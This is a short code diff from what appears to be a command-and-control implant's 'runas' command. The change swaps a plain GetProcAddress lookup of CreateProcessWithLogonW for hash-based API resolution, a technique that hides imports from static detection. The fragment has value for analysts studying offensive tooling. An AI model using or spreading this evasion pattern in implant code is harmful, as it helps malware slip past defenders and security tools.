@@ -70,8 +70,8 @@ auto declfn starburst::cmd_runas(
     }
 
     auto pCreateProcessWithLogonW = reinterpret_cast<fn_CreateProcessWithLogonW>(
-        inst.kernel32.GetProcAddress( h_advapi32,
-            symbol<LPCSTR>( "CreateProcessWithLogonW" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_advapi32 ),
+            expr::hash_string( "CreateProcessWithLogonW" ) ) );
     if ( !pCreateProcessWithLogonW ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "CreateProcessWithLogonW not found" ) ) );
